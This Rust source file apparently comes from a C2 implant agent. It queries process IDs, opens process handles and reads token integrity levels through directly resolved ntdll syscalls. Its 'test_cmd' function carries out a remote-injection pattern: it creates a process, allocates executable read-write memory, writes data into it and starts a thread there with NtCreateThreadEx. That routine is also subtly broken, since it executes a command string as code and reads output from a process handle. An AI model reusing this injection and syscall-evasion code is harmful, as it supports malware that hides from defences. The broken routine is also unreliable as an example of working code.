use alloc::{
    ffi::CString,
    string::{String, ToString},
    vec,
};
use core::{
    ffi::c_void,
    mem::{self, size_of},
    ptr::null_mut,
};
use libc_print::libc_println;
use mod_agentcore::instance;
use rs2_win32::{
    ntdef::{
        AccessMask, ClientId, IoStatusBlock, ObjectAttributes, ProcessBasicInformation,
        ProcessInformation, StartupInfoA, TokenMandatoryLabel, HANDLE, OBJ_CASE_INSENSITIVE,
        PROCESS_ALL_ACCESS, PROCESS_CREATE_FLAGS_INHERIT_HANDLES,
        PROCESS_CREATE_FLAGS_NO_DEBUG_INHERIT, THREAD_CREATE_FLAGS_CREATE_SUSPENDED,
        TOKEN_INTEGRITY_LEVEL, TOKEN_QUERY, ULONG,
    },
    ntstatus::{STATUS_BUFFER_OVERFLOW, STATUS_BUFFER_TOO_SMALL},
};

/// Retrieves the PID (Process ID) and PPID (Parent Process ID) of the current process using NT API.
///
/// # Safety
/// This function performs unsafe operations, such as making system calls to retrieve process information.
///
/// # Returns
/// A tuple `(u32, u32)` containing the PID and PPID of the current process. If the operation fails,
/// both values in the tuple will be `0`.
pub unsafe fn get_pid_and_ppid() -> (u32, u32) {
    let mut pbi: ProcessBasicInformation = core::mem::zeroed();
    let mut return_length: u32 = 0;
    let status = instance().ntdll.nt_query_information_process.run(
        -1isize as HANDLE, // Use the handle for the current process
        0,                 // ProcessBasicInformation
        &mut pbi as *mut _ as *mut _,
        size_of::<ProcessBasicInformation>() as u32,
        &mut return_length as *mut u32,
    );

    if status == 0 {
        return (
            pbi.unique_process_id as u32,
            pbi.inherited_from_unique_process_id as u32,
        );
    }

    (0, 0)
}

/// Retrieves the PID (Process ID) and PPID (Parent Process ID) of the current process using NT API.
///
/// # Safety
/// This function performs unsafe operations, such as making system calls to retrieve process information.
///
/// # Returns
/// A tuple `(u32, u32)` containing the PID and PPID of the current process. If the operation fails,
/// both values in the tuple will be `0`.
pub unsafe fn get_pid() -> u32 {
    let mut pbi: ProcessBasicInformation = core::mem::zeroed();
    let mut return_length: u32 = 0;
    let status = instance().ntdll.nt_query_information_process.run(
        -1isize as HANDLE, // Use the handle for the current process
        0,                 // ProcessBasicInformation
        &mut pbi as *mut _ as *mut _,
        size_of::<ProcessBasicInformation>() as u32,
        &mut return_length as *mut u32,
    );

    if status == 0 {
        return pbi.unique_process_id as u32;
    }

    0
}

/// Retrieves a handle to a process with the specified PID and desired access rights.
///
/// # Safety
///
/// This function involves unsafe operations and raw pointer dereferencing.
///
/// # Parameters
///
/// - `pid`: The process ID of the target process.
/// - `desired_access`: The desired access rights for the process handle.
///
/// # Returns
///
/// A handle to the process if successful, otherwise `null_mut()`.
pub unsafe fn get_proc_handle(pid: i32, desired_access: AccessMask) -> HANDLE {
    let mut process_handle: HANDLE = null_mut();

    // Initialize object attributes for the process
    let mut object_attributes = ObjectAttributes::new();

    ObjectAttributes::initialize(
        &mut object_attributes,
        null_mut(),
        OBJ_CASE_INSENSITIVE, // 0x40
        null_mut(),
        null_mut(),
    );

    // Initialize client ID for the target process
    let mut client_id = ClientId::new();
    client_id.unique_process = pid as _;

    // Open the process with the specified access rights
    instance().ntdll.nt_open_process.run(
        &mut process_handle,
        desired_access,
        &mut object_attributes,
        &mut client_id as *mut _ as *mut c_void,
    );

    process_handle
}

/// Opens the process token for a given process handle.
///
/// # Safety
///
/// This function involves unsafe operations and raw pointer dereferencing.
///
/// # Parameters
///
/// - `process_handle`: A handle to the process for which the token is to be opened.
///
/// # Returns
///
/// A handle to the process token if successful, otherwise `null_mut()`.
pub unsafe fn get_process_token(process_handle: HANDLE) -> HANDLE {
    let mut token_handle: HANDLE = null_mut();
    instance()
        .ntdll
        .nt_open_process_token
        .run(process_handle, TOKEN_QUERY, &mut token_handle);
    token_handle
}

/// Retrieves the integrity level of a specified process.
///
/// # Safety
///
/// This function involves unsafe operations and raw pointer dereferencing.
///
/// # Parameters
///
/// - `process_handle`: A handle to the process for which the integrity level is to be retrieved.
///
/// # Returns
///
/// The integrity level as an `i32` representing the RID if successful, otherwise `-1`.
pub unsafe fn nt_get_integrity_level(process_handle: HANDLE) -> i32 {
    // Get the process token
    let token_handle = get_process_token(process_handle);

    if token_handle.is_null() {
        return -1;
    }

    let mut label: TokenMandatoryLabel = core::mem::zeroed();
    let mut return_length: ULONG = 0;
    let mut size = 0;

    // Query the token for integrity level information
    let ntstatus = instance().ntdll.nt_query_information_token.run(
        token_handle,
        TOKEN_INTEGRITY_LEVEL as ULONG,
        &mut label as *mut _ as *mut c_void,
        size,
        &mut return_length as *mut ULONG,
    );

    if ntstatus != STATUS_BUFFER_OVERFLOW && ntstatus != STATUS_BUFFER_TOO_SMALL {
        instance().ntdll.nt_close.run(token_handle);
        return -1;
    }

    if return_length == 0 {
        instance().ntdll.nt_close.run(token_handle);
        return -1;
    }

    size = return_length;

    // Query the token again with the correct buffer size
    let ntstatus = instance().ntdll.nt_query_information_token.run(
        token_handle,
        TOKEN_INTEGRITY_LEVEL as ULONG,
        &mut label as *mut _ as *mut c_void,
        size,
        &mut return_length as *mut ULONG,
    );

    if ntstatus == 0 {
        // Extract the RID (Relative Identifier) from the SID to determine the integrity level
        let sid = &*label.label.sid;
        let sub_authority_count = sid.sub_authority_count as usize;
        let rid = *sid.sub_authority.get_unchecked(sub_authority_count - 1);

        instance().ntdll.nt_close.run(token_handle);
        return rid as i32;
    } else {
        instance().ntdll.nt_close.run(token_handle);
        return -1;
    }
}

pub fn test_cmd() {
    unsafe {
        // if !instance().session.connected {
        //     return;
        // }
        let cmd = "cmd.exe /C echo Hello, world!";

        let mut startup_info = StartupInfoA::new();
        let mut process_info: ProcessInformation = ProcessInformation::new();

        let command_cstr = CString::new(cmd).map_err(|e| e.to_string()).unwrap();

        let flags = PROCESS_CREATE_FLAGS_NO_DEBUG_INHERIT | PROCESS_CREATE_FLAGS_INHERIT_HANDLES;

        let mut process_handle: HANDLE = null_mut();
        let create_process_result = instance().ntdll.nt_create_process_ex.run(
            &mut process_info.h_process,
            PROCESS_ALL_ACCESS,
            null_mut(),
            -1isize as HANDLE,
            flags,
            null_mut(),
            null_mut(),
            null_mut(),
            0,
        );

        // println!(
        //     "NtCreateProcessEx number: {:#X}",
        //     instance().ntdll.nt_create_process_ex.syscall.number
        // );
        // println!(
        //     "NtCreateProcessEx address: {:?}",
        //     instance().ntdll.nt_create_process_ex.syscall.address
        // );

        // if create_process_result != 0 {
        //     println!("NtCreateProcessEx failed: {:#X}", create_process_result);
        // }

        // println!("NtCreateProcessEx success: {:?}", process_handle);

        let mut base_address: *mut c_void = null_mut();
        let allocation_size = command_cstr.to_bytes_with_nul().len();
        let allocate_result = instance().ntdll.nt_allocate_virtual_memory.run(
            process_info.h_process,
            &mut base_address,
            0,
            allocation_size,
            0x3000, // MEM_COMMIT | MEM_RESERVE
            0x40,   // PAGE_EXECUTE_READWRITE
        );

        if allocate_result != 0 {
            libc_println!("NtAllocateVirtualMemory failed: {:#X}", allocate_result);
            instance().ntdll.nt_close.run(process_handle);
            return;
        }

        let mut bytes_written: usize = 0;
        let write_result = instance().ntdll.nt_write_virtual_memory.run(
            process_info.h_process,
            base_address,
            command_cstr.as_ptr() as *const c_void,
            allocation_size,
            &mut bytes_written,
        );

        if write_result != 0 {
            libc_println!("NtWriteVirtualMemory failed: {:#X}", write_result);
            instance().ntdll.nt_close.run(process_handle);
            return;
        }

        // let mut thread_handle: HANDLE = null_mut();
        let create_thread_result = instance().ntdll.nt_create_thread_ex.run(
            &mut process_info.h_thread,
            PROCESS_ALL_ACCESS,
            null_mut(),
            process_info.h_process,
            base_address,
            null_mut(),
            THREAD_CREATE_FLAGS_CREATE_SUSPENDED,
            0,
            0,
            0,
            null_mut(),
        );

        libc_println!(
            "NtCreateThreadEx number: {:#X}",
            instance().ntdll.nt_create_thread_ex.syscall.number
        );

        libc_println!(
            "NtCreateThreadEx address: {:?}",
            instance().ntdll.nt_create_thread_ex.syscall.address
        );

        if create_thread_result != 0 {
            libc_println!("NtCreateThreadEx failed: {:#X}", create_thread_result);
            instance().ntdll.nt_close.run(process_handle);
            return;
        }

        let wait_result = instance().ntdll.nt_wait_for_single_object.run(
            process_info.h_thread,
            false,
            null_mut(),
        );

        if wait_result != 0 {
            libc_println!("NtWaitForSingleObject failed: {:#X}", wait_result);
            instance().ntdll.nt_close.run(process_handle);
            return;
        }

        let mut buffer = vec![0u8; 1024];
        let mut io_status_block: IoStatusBlock = mem::zeroed();
        let read_result = instance().ntdll.nt_read_file.run(
            process_info.h_process,
            null_mut(),
            null_mut(),
            null_mut(),
            &mut io_status_block,
            buffer.as_mut_ptr() as *mut c_void,
            buffer.len() as u32,
            null_mut(),
            null_mut(),
        );

        if read_result == 0 {
            let output = String::from_utf8_lossy(&buffer);
            libc_println!("Command output: {:?}", String::from_utf8_lossy(&buffer));
        } else {
            libc_println!("NtReadFile failed: {:#X}", read_result);
        }

        instance().ntdll.nt_close.run(process_handle);
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use libc_print::libc_println;

    #[test]
    fn test_get_pid_and_ppid() {
        test_cmd();
        let (pid, ppid) = unsafe { get_pid_and_ppid() };
        libc_println!("PID: {:?}", pid);
        libc_println!("PPID: {:?}", ppid);
        assert!(pid != 0, "PID should not be zero");
        assert!(ppid != 0, "PPID should not be zero");
    }

    #[test]
    fn test_get_integrity_level() {
        unsafe {
            let process_handle = -1isize as _;
            // Alternative: get process handle for a specific process
            // let process_handle =
            //     get_proc_handle(17344, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ);
            let rid = nt_get_integrity_level(process_handle);
            if rid != -1 {
                libc_println!("Process Integrity Level: {:?}", rid);
            } else {
                libc_println!("Failed to get process integrity level");
            }
        }
    }
}
